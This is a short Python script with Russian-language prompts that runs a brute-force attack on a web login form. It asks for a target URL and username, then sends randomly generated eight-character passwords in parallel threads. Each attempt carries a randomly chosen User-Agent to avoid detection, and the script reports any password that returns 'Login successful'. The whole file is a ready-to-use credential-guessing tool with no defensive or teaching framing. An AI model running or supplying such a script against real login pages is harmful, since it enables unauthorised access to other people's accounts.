import requests
import random
import string
from tqdm import tqdm
from pystyle import Colors, Colorate
from concurrent.futures import ThreadPoolExecutor

# URL для входа
login_url = input('URL для брутфорса > ')

with open('user_agent.txt', 'r') as file:
    user_agents = [line.strip() for line in file]

username = input("\nВведите имя пользователя: ")


def generate_password(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def check_password(username, password, user_agent):
    headers = {
        "User-Agent": user_agent
    }
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(login_url, headers=headers, data=data)
    if "Login successful" in response.text:
        return password
    return None


def brute_force_passwords(num_attempts):
    with ThreadPoolExecutor() as executor:
        futures = []
        for _ in range(num_attempts):
            user_agent = random.choice(user_agents)
            random_password = generate_password()
            futures.append(executor.submit(check_password, username, random_password, user_agent))

        for future in tqdm(futures, desc="\nГенерация и проверка паролей", unit="пароль"):
            result = future.result()
            if result:
                print(Colorate.Horizontal(Colors.green_to_white, f"\nСлучайный пароль найден: {result}"))
                return

    print(Colorate.Horizontal(Colors.red_to_white, "\nНе удалось найти подходящий пароль"))


num_attempts = 100
brute_force_passwords(num_attempts)
